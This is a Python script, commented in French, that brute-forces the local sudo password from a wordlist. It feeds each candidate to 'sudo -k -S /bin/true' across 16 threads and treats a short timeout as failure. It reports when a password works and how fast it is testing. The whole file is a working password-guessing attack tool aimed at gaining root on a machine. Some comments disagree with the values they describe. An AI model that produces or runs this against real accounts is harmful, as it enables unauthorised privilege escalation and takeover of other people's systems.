import subprocess
import time
import argparse
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- CONFIGURATION EXTRÊME ---
# 32 workers permettent de saturer les 16 coeurs pendant les attentes I/O
MAX_WORKERS = 16
# Oracle abaissé à 0.07s car /bin/true répond beaucoup plus vite que whoami
ORACLE_TIMEOUT = 0.080
# ------------------------------

def check_pw(pw):
    """Test unitaire ultra-rapide via /bin/true"""
    try:
        # L'utilisation de 'true' évite de charger les libs de qui/id
        # Redirection vers DEVNULL pour supprimer l'overhead de lecture stdout
        proc = subprocess.Popen(
            ["/usr/bin/sudo", "-k", "-S", "/bin/true"],
            stdin=subprocess.PIPE,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            text=True
        )
        try:
            proc.communicate(input=f"{pw}\n", timeout=ORACLE_TIMEOUT)
            if proc.returncode == 0:
                return pw
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
    except Exception:
        pass
    return None

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--wordlist", required=True)
    args = parser.parse_args()

    if not os.path.exists(args.wordlist):
        print(f"[-] Fichier {args.wordlist} introuvable.")
        return

    print(f"🚀 Bruteforce it !!! | Workers: {MAX_WORKERS} | Oracle: {ORACLE_TIMEOUT}s")
    print("-" * 60)

    attempts = 0
    start_time = time.time()

    # ThreadPoolExecutor gère le streaming sans "hang" entre les batches
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {}
        
        with open(args.wordlist, "r", encoding="latin-1", errors="ignore") as f:
            # Remplissage initial du pipeline
            for _ in range(MAX_WORKERS):
                line = f.readline()
                if not line: break
                pw = line.strip()
                if pw:
                    futures[executor.submit(check_pw, pw)] = pw

            # Boucle de streaming asynchrone
            while futures:
                # as_completed est la clé : on traite dès qu'un thread a fini
                for future in as_completed(futures):
                    pw_tested = futures.pop(future)
                    attempts += 1
                    
                    # Succès ?
                    result = future.result()
                    if result:
                        elapsed = time.time() - start_time
                        print(f"\n\n✅ TROUVÉ : {result}")
                        print(f"[*] Stats finales : {attempts} tests en {elapsed:.2f}s ({attempts/elapsed:.2f} mdp/s)")
                        os._exit(0)

                    # Affichage par modulo pour ne pas ralentir le CPU avec le terminal
                    if attempts % 10 == 0:
                        sys.stdout.write(f"\r[*] Tentatives : {attempts} | Speed: ~{int(attempts/(time.time()-start_time))} mdp/s | Test: {pw_tested[:12]:<12}")
                        sys.stdout.flush()

                    # Recharge immédiatement le pipeline
                    next_line = f.readline()
                    if next_line:
                        next_pw = next_line.strip()
                        if next_pw:
                            futures[executor.submit(check_pw, next_pw)] = next_pw
                    
                    # On repasse au as_completed pour maintenir le flux tendu
                    break

if __name__ == "__main__":
    main()
